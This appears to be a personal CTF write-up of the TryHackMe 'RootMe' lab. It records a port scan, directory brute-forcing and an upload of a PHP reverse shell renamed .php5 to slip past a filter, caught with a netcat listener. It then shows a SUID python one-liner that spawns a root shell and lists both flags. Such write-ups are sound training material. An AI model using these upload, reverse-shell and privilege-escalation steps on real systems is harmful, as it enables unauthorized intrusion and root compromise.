2025-06-19 01:15

Status:

Tags: #CTF

# ROOTME

## Joining Room Using Open vpn 
- Installing open vpn 
	- ``sudo apt install openvpn``
	- ``sudo apt install network-manager-openvpn network-manager-openvpn-gnome ``
	- `` sudo reboot``
- configuration 
	- Download openvpnfile from tryhackme 
		- ``sudo cp errorcode09.ovpn /etc/openvpn 
	- open vpn 
		- ``sudo openvpn --config errorcode09.ovpn 
## Recon
- perforom nmap scan machine 
	- `` sudo nmap 10.10.76.57 -sV ``
- ouput 
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Find directories on the web server using the GoBuster tool 
```bash
gobuster dir -u  http://10.10.76.57/ -w /usr/share/wordlists/dirb/common.txt  
```
- output 
```bash
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.76.57/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 307] [--> http://10.10.76.57/js/]
/panel                (Status: 301) [Size: 310] [--> http://10.10.76.57/panel/]
/server-status        (Status: 403) [Size: 276]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.76.57/uploads/] 
```

## Getting a shell
1. upload payload in ``/uploads/ ``directory
2.  payload php from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
3. edit file 
	- ip = 10.23.129.129  (tun0)
	- rename = .php5
4. open netcat listener
	- `` nc -lvnp 12345 ``
5. find file name user.txt 
	- `` find / -name user.txt ``
		- `` /var/www/user.txt``
	- THM{y0u_g0t_a_sh3ll}
## Privilege escalation
1. Search for files with SUID permission, which file is weird?
	- ``find / -perm /4000 2>/dev/null ``
	- `` /usr/bin/python ``
2. search for python SUID in gtofbin
	- `` ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'``
3. run above command in the location of file 
	- `` /usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")' `` 
4. you become root and find root.txt file 
	- `` find / -name root.txt ``
		- `` /root/root.txt``
- get final flag 
	-  ``cat root.txt``
		- ``THM{p1v1l3g3_3sc4l4t10n}``

### References
